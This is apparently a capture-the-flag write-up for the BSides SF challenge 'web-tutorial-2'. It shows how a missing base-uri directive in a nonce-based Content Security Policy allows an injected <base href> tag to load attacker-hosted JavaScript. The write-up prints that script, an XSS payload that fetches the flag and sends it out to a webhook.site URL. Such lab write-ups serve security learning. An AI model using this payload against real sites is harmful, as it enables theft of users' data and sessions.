---
title: "bsides-ctf — web-tutorial-2 (web)"
pubDate: "2026-03-21"
updatedDate: "2026-03-21"
event: "bsides-ctf"
author: "slacksleepsloth"
score: ""
description: |
  > same as web tutorial 1 but the CSP is different.
tags: ["web"]
---

# web-tutorial-2 — bsides-ctf (web)

The CSP to deal with

```http
content-security-policy:
default-src 'self';
script-src 'self' 'nonce-AxTYup01jhBMgmiNwTwUgfS1PZeZ58rE';
connect-src *;
style-src-elem 'self' fonts.googleapis.com fonts.gstatic.com; font-src 'self' fonts.gstatic.com fonts.googleapis.com
```

[https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html#nonce-based-strict-policy](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html#nonce-based-strict-policy)

```http
Nonce-based Strict Policy

Content-Security-Policy:
  script-src 'nonce-{RANDOM}' 'strict-dynamic';
  object-src 'none';
  base-uri 'none';
```

In here you can see Nonce being mentioned but from the CSP in the site it is clear that base-uri is missing so we can try exploiting that

Differing from web-tutorial-1 unsafe-inline is not here so you cannot just any how inject a `<script>` for the xss
so idea is to have a site hosting the js code from web tutorial 1 and have the site reference that file hosted on my site
also we need to specify the url in this case cause idk whether it will be routing towards my site's url or the ctf site url

```javascript
fetch("https://web-tutorial-2-9fec29fc.challenges.bsidessf.net/xss-two-flag")
  .then((response) => response.text())
  .then((data) => {
    fetch(
      "https://webhook.site/3a710965-4765-46ab-a0b8-e943b3d11c92/?flag=" +
        encodeURIComponent(data),
    );
  });
```

So to use the base uri opening we just do

```html
<base href="https://<my site>/test.js" />
```

get the flag
![image.png](image.png)
